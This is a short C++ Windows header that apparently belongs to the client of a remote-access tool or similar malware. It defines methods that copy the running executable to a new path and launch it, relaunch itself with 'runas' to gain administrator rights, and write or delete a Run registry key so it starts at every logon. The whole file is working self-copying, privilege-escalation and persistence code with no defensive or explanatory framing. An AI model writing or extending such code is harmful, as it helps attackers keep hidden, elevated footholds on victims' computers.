#include "Includes.h"
#include "Auxiliary.h"
#include "_Config.h"

#ifndef IMPLEMENTATION_H

class implementation {
public:
	bool Migrate(std::string Path, bool uParam) {
		if (CopyFile(GetCurrentPathC().c_str(), Path.c_str(), FALSE)) {
			if (uParam) {
				STARTUPINFO startinfo = { 0 };
				PROCESS_INFORMATION processInfo = { 0 };
				if (CreateProcess(Path.c_str(), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &startinfo, &processInfo)) {
					return true;
				}
			} else { return true; }
		}
		return false;
	}

	bool PrivilegeRequest() {
		ShellExecuteA(NULL,
			"runas",
			GetCurrentPathC().c_str(),
			NULL,
			NULL,              
			SW_SHOWNORMAL
		);
		exit(0);
	}

	bool Fixation(bool uParam) {
		if (uParam) {
			if (RegWriteKey(CLIENT_HKEY_TYPE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", CLIENT_REG_NAME, GetCurrentPathC())) {
				return true;
			}
		} else {
			if (RegDeleteKeyValueA(CLIENT_HKEY_TYPE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", CLIENT_REG_NAME) == ERROR_SUCCESS) {
				return true;
			}
		}
		return false;
	}
};

implementation Implementation;

#endif